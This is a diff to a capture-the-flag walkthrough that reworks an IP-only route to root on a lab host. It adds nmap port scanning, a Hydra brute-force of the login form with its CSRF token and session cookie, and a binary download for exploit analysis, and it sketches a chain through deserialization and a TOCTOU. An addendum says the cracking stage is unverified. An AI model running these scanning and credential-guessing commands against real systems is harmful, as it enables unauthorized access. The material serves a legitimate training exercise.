@@ -5,49 +5,49 @@
 > not distribute it at the start of a blind event unless you intend to turn the
 > challenge into a guided exercise.
 
-This is the manual route from the supplied portal credentials to the root
+This is the manual route from a single assigned EC2 IP address to the root
 flag. It does **not** call any repository exploit, test, attack, or raw-RPC
 helper. Every request, pickle, database call, Worker frame, and Supervisor
 message is constructed in the commands below.
 
-## What a fair blind player must receive
+## IP-only starting point
 
-An IP address, username, password, and topology are enough to discover the
-normal Web and tunnel behavior. They are **not** enough to infer arbitrary
-class fields, hidden route names, protocol words, or a native binary's memory
-layout.
+Give the player only the EC2 IPv4 address. They use local username and password
+wordlists with Hydra against the public login form; the command below carries
+the form's session cookie and CSRF token and is throttled to respect Nginx's
+login limit. The exact deployed Worker binary is independently downloadable
+from `https://<EC2-IP>/artifacts/relay-worker` before login. This is an explicit
+public challenge artifact; it is not extracted from the Web container or a
+host path through Web RCE.
 
-For a genuinely blind but solvable event, also provide:
-
-- sanitized Web source containing the remember-cookie loader, `prefs.py`, and
-  the one-shot result route;
-- sanitized Access parser source; and
-- the exact AMD64 `relay-worker` binary used by the deployment.
-
-Do not provide the repository's solution scripts. The final Supervisor source
-does not need to be in the handout because a player can read it after reaching
-the native Worker shell.
-
-The Web commands assume Bash or Zsh on Linux, macOS, or WSL with `curl`, Python
-3, `grep`, `sed`, and `nc`. The Worker-analysis block requires AMD64 Linux or
-WSL with GNU binutils (`file`, `strings`, `readelf`, and `objdump`); macOS's
-native tools are not drop-in replacements for those commands.
+The commands assume Bash or Zsh, `nmap`, `curl`, Hydra, Python 3, `grep`,
+`sed`, and `nc`. The Worker-analysis block requires AMD64 Linux or WSL with
+GNU binutils (`file`, `strings`, `readelf`, and `objdump`); macOS's native tools
+are not drop-in replacements for those commands.
 
 ## 1. Log in without using the browser
 
-Set the values supplied to the player:
+Set the only challenge value and the player's local wordlist paths:
 
 ```bash
-RF_HOST='<target-ip-or-dns>'
+RF_HOST='<ec2-ip-address>'
 RF_BASE="https://$RF_HOST"
-RF_USER='<given-username>'
-RF_PASSWORD='<given-password>'
+RF_USERS='<path-to-local-usernames-wordlist>'
+RF_PASSWORDS='<path-to-local-password-wordlist>'
 RF_JAR="$(mktemp)"
 RF_PAGE="$(mktemp)"
 RF_DASH="$(mktemp)"
 ```
 
-Fetch the login page, extract its CSRF token, and submit the credentials:
+Discover the public portal and the transient Worker port range:
+
+```bash
+nmap -Pn -sV -p 443,25000-25099 "$RF_HOST"
+```
+
+Hydra needs the session and CSRF token issued by the login page. Keep one
+thread and wait eight seconds between attempts: Nginx allows eight login
+requests per minute, and faster guessing will only hit its rate limit.
 
 ```bash
 curl -ksS -c "$RF_JAR" "$RF_BASE/login" -o "$RF_PAGE"
@@ -56,6 +56,23 @@ RF_CSRF="$(
   sed -n 's/.*name="csrf_token" value="\([^"]*\)".*/\1/p' "$RF_PAGE"
 )"
 
+RF_SESSION="$(
+  awk '$6 == "session" { value=$7 } END { print value }' "$RF_JAR"
+)"
+
+RF_FORM="/login:username=^USER^&password=^PASS^&csrf_token=$RF_CSRF:G=:H=Cookie\: session=$RF_SESSION:F=Incorrect username or password."
+hydra -L "$RF_USERS" -P "$RF_PASSWORDS" -t 1 -W 8 -f \
+  "$RF_HOST" https-post-form "$RF_FORM"
+
+RF_USER='<username reported by Hydra>'
+RF_PASSWORD='<password reported by Hydra>'
+
+# Start a fresh browser session with the recovered pair.
+RF_JAR="$(mktemp)"
+curl -ksS -c "$RF_JAR" "$RF_BASE/login" -o "$RF_PAGE"
+RF_CSRF="$(
+  sed -n 's/.*name="csrf_token" value="\([^"]*\)".*/\1/p' "$RF_PAGE"
+)"
 curl -ksS \
   -b "$RF_JAR" \
   -c "$RF_JAR" \
@@ -64,10 +81,6 @@ curl -ksS \
   --data-urlencode "password=$RF_PASSWORD" \
   "$RF_BASE/login" \
   -o /dev/null
-
-RF_SESSION="$(
-  awk '$6 == "session" { value=$7 } END { print value }' "$RF_JAR"
-)"
 
 RF_REMEMBER="$(
   awk '$6 == "remember_prefs" { value=$7 } END { print value }' "$RF_JAR"
@@ -120,8 +133,8 @@ curl -ksS \
 grep -E 'remember_prefs|RememberedPrefs|JobTemplate|JobRunner'
 ```
 
-The supplied sanitized Web source explains why those names matter. Search it
-instead of guessing:
+For organizer-side analysis, inspect the local sanitized Web source; it is not
+an additional player handout:
 
 ```bash
 grep -RInE \
@@ -235,19 +248,25 @@ database connection variables, neither privileged socket, and the exact
 `relay_web_api.submit_raw_request(...)` call. A successful direct call below
 proves that the restricted database role may execute that function.
 
-The Access artifact shows that the first `profile` value is authoritative:
+For organizer-side analysis, the local Access source confirms that the first
+`profile` value is authoritative:
 
 ```bash
 grep -nE 'profiles|effective_profile|profiles\[0\]|first-profile' \
   '<path-to-sanitized-access-source>/policy.py'
 ```
 
-The Worker artifact must then be analyzed to see how the same signed bytes are
-used at runtime:
+Download the exact Worker executable used by the host from the public
+artifact endpoint, then analyze it to see how the same signed bytes are used
+at runtime:
 
 ```bash
-RF_WORKER='<path-to-exact-relay-worker-binary>'
+RF_WORKER_DIR="$(mktemp -d)"
+RF_WORKER="$RF_WORKER_DIR/relay-worker"
+curl -kfsS "$RF_BASE/artifacts/relay-worker" -o "$RF_WORKER"
+chmod 0644 "$RF_WORKER"
 file "$RF_WORKER"
+sha256sum "$RF_WORKER"
 readelf -hW "$RF_WORKER"
 strings -a "$RF_WORKER" |
   grep -E 'TOKEN|CONNECT|LEAK|OVERFLOW|worker_shell|profile|legacy'
@@ -469,8 +488,9 @@ command while the same Worker is still alive.
 ## Why this is still called blind discovery
 
 The player is not given a working exploit or told to run a project helper.
-They use supplied analyzable artifacts to derive each arbitrary interface,
-then manually reproduce it with standard tools. The evidence chain is:
+They recover a login pair against the target, download the deployed Worker
+binary from the target, and derive the remaining interfaces through observed
+behavior and static analysis. The evidence chain is:
 
 ```text
 authenticated cookie inspection
@@ -483,7 +503,62 @@ authenticated cookie inspection
   -> host UID 0 and root flag
 ```
 
-If the organizer gives only topology and credentials, Phases 1 through 4
-depend on guessing hidden constants and are not a fair blind challenge. In
-that format this document is a guided solution, not evidence that the chain
-was independently discoverable.
+The player starts with only the EC2 IP. The login pair is recovered against
+the rate-limited public form, and the native Worker binary is downloaded from
+the same IP. The remaining Web and Worker interfaces are derived through the
+challenge's observable behavior and the explicitly public binary artifact.
+
+## Addendum: IP-Only Discovery and Verification Status
+
+This addendum is authoritative where earlier sections imply more than the
+current implementation proves. It is intentionally additive; it does not
+replace the material above.
+
+The exact Worker URI is discoverable by ordinary web enumeration through the
+standard `robots.txt` resource. The current workspace Nginx configuration now
+returns:
+
+```text
+User-agent: *
+Allow: /artifacts/relay-worker
+```
+
+From the assigned IP, request that resource before guessing a path:
+
+```bash
+curl -kfsS "$RF_BASE/robots.txt"
+```
+
+The advertised path leads to the exact Worker file through Nginx's read-only
+single-file mount. Download and inspect it only after observing that path:
+
+```bash
+curl -kfsS "$RF_BASE/artifacts/relay-worker" -o relay-worker
+file relay-worker
+sha256sum relay-worker
+readelf -hW relay-worker
+readelf -lW relay-worker
+readelf -dW relay-worker
+```
+
+This clue is **source-confirmed in the current workspace**, but availability
+from the EC2 deployment remains **unverified until redeployment and a remote
+request**. A digest computed locally records the downloaded file; it is not an
+authenticity check unless compared with an independently trusted deployment
+digest.
+
+The login credential stage is still **not established as a working IP-only
+cracking stage**. Hydra requires candidate usernames/passwords and a valid
+CSRF/session request; the deployment's login rate limit is eight requests per
+minute plus a burst. The seeded `guest` credentials are in organizer-side
+source and are not discoverable through the present public routes. Do not
+describe generic wordlist guessing as successful or verified. The credential
+stage needs a bounded candidate clue or an intentionally downloadable
+offline-cracking artifact before this walkthrough is reproducible from only
+the IP.
+
+Likewise, a pre-request port scan cannot discover a live Worker: the port is
+selected dynamically from `25000-25099` and is only listening while a job is
+active. Learn the actual port from the authenticated request status, then test
+that specific port. The final host operation in this version is Supervisor's
+`diagnose` pathname TOCTOU; there is no `archive` operation.
